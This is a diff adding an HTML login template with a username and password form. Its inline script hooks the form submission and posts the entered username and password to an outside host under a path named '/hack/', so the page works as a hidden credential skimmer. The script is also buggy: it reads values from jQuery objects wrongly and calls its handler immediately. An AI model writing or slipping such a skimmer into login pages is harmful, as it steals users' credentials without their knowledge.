@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>LOGIN</title>
+        <script
+  src="https://code.jquery.com/jquery-3.3.1.js"
+  integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
+  crossorigin="anonymous"></script>
+    </head>
+    
+    <body style="font-family:sans-serif;">
+        <form method='POST' action=''>
+        {%csrf_token%}
+        <input type='text' name='username' placeholder='username'>    
+        <input type='password' name='password' placeholder='password'>
+        <button>SUBMIT</button>
+        </form>
+    </body>
+    <script type="text/javascript">
+        $("form").on('submit',function()
+                               {
+									var xhttp =new XMLHttpRequest();
+xhttp.open("POST","https://attendence-system-akshay-chhajed.c9users.io/hack/",true);
+									xhttp.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+var username = $("input[name='username']").value;
+var password = $("input[name='password']").value;
+console.log(username);
+var body="username="+username+"&password="+password;
+xhttp.send(body);}());
+
+    </script>
+</html>
